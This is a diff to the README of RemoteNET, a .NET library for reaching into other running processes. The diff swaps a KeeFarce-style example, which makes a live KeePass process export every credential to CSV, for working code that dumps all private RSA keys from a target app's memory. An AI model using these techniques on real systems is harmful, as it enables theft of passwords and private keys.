@@ -35,40 +35,32 @@ There are 2 ways to get the library:
 10. Compile the RemoteNET project
 
 ## Minimal Working Example
-To get the essence of how easy and usefull this library can be, see below a re-implementation of [denandz/KeeFarce](https://github.com/denandz/KeeFarce).  
-This example interacts with an open KeePass process and makes it export all credentials to a CSV file.  
+This fun example dumps all private RSA keys (which are stored in `RSACryptoServiceProvider`s) in a target app's memory:
 ```C#
-// Gain foothold within the target process
-RemoteApp remoteApp = RemoteAppFactory.Connect("KeePass.exe", RuntimeType.Managed);
-RemoteActivator rActivator = remoteApp.Activator;
+Func<byte[], string> ToHex = ba => BitConverter.ToString(ba).Replace("-", "");
 
-// Get a remote DocumentManagerEx object
-IEnumerable<CandidateObject> candidates = remoteApp.QueryInstances("KeePass.UI.DocumentManagerEx");
-RemoteObject remoteDocumentManagerEx = remoteApp.GetRemoteObject(candidates.Single());
-dynamic dynamicDocumentManagerEx = remoteDocumentManagerEx.Dynamify();
-
-// Get sensitive properties to dump
-dynamic activeDb = dynamicDocumentManagerEx.ActiveDatabase;
-dynamic rootGroup = activeDb.RootGroup;
-
-// Create remote PwExportInfo object (Call Ctor)
-RemoteObject pwExportInfo = rActivator.CreateInstance("KeePass.DataExchange.PwExportInfo", rootGroup, activeDb, true);
-
-// Create remote KeePassCsv1x (Call Ctor)
-RemoteObject keePassCsv1x = rActivator.CreateInstance("KeePass.DataExchange.Formats.KeePassCsv1x");
-dynamic dynamicCsvFormatter = keePassCsv1x.Dynamify();
-
-// Creating a remote FileStream object
-string tempOutputFile = Path.ChangeExtension(Path.GetTempFileName(), "csv");
-RemoteObject exportFileStream = rActivator.CreateInstance(typeof(FileStream), tempOutputFile, FileMode.Create);
-
-// Calling Export method of exporter
-dynamicCsvFormatter.Export(pwExportInfo, exportFileStream, null);
-
-// Showing results in default CSV editor.
-Console.WriteLine($"Output written to: {tempOutputFile}");
-Process.Start(tempOutputFile);
+// Finding every RSACryptoServiceProvider instance
+var rsaProviderCandidates = remoteApp.QueryInstances(typeof(RSACryptoServiceProvider));
+foreach (CandidateObject candidateRsa in rsaProviderCandidates)
+{
+    RemoteObject rsaProv = remoteApp.GetRemoteObject(candidateRsa);
+    dynamic dynamicRsaProv = rsaProv.Dynamify();
+    // Calling remote `ExportParameters`.
+    // First parameter (true) indicates we want the private key.
+    Console.WriteLine(" * Key found:");
+    dynamic parameters = dynamicRsaProv.ExportParameters(true);
+    Console.WriteLine("Modulus: " + ToHex(parameters.Modulus));
+    Console.WriteLine("Exponent: " + ToHex(parameters.Exponent));
+    Console.WriteLine("D: " + ToHex(parameters.D));
+    Console.WriteLine("P: " + ToHex(parameters.P));
+    Console.WriteLine("Q: " + ToHex(parameters.Q));
+    Console.WriteLine("DP: " + ToHex(parameters.DP));
+    Console.WriteLine("DQ: " + ToHex(parameters.DQ));
+    Console.WriteLine("InverseQ: " + ToHex(parameters.InverseQ));
+}
 ```
+
+For a more advanced example, [See this "KeeFarce" remake](./KeeFarce_lookalike.md).
 
 ## How To Use
 This section documents most parts of the library's API which you'll likely need.
@@ -134,30 +126,8 @@ foreach (CandidateObject candidate in sqlConCandidates)
 
 ### ✳️ Invoking Remote Methods
 Just like accessing fields, invoking methods can be done on the dynamic objects.  
-This fun example dumps all private RSA keys (which are stored in `RSACryptoServiceProvider`s) found in the target's memory:
-```C#
-Func<byte[], string> ToHex = ba => BitConverter.ToString(ba).Replace("-", "");
+See above example about dumping RSA keys.
 
-// Finding every RSACryptoServiceProvider instance
-var rsaProviderCandidates = remoteApp.QueryInstances(typeof(RSACryptoServiceProvider));
-foreach (CandidateObject candidateRsa in rsaProviderCandidates)
-{
-    RemoteObject rsaProv = remoteApp.GetRemoteObject(candidateRsa);
-    dynamic dynamicRsaProv = rsaProv.Dynamify();
-    // Calling remote `ExportParameters`.
-    // First parameter (true) indicates we want the private key.
-    Console.WriteLine(" * Key found:");
-    dynamic parameters = dynamicRsaProv.ExportParameters(true);
-    Console.WriteLine("Modulus: " + ToHex(parameters.Modulus));
-    Console.WriteLine("Exponent: " + ToHex(parameters.Exponent));
-    Console.WriteLine("D: " + ToHex(parameters.D));
-    Console.WriteLine("P: " + ToHex(parameters.P));
-    Console.WriteLine("Q: " + ToHex(parameters.Q));
-    Console.WriteLine("DP: " + ToHex(parameters.DP));
-    Console.WriteLine("DQ: " + ToHex(parameters.DQ));
-    Console.WriteLine("InverseQ: " + ToHex(parameters.InverseQ));
-}
-```
 ### ✳️ Remote Events
 You can also subscribe to/unsubscribe from remote events. The syntax is similar to "normal C#" although not exact:
 ```C#
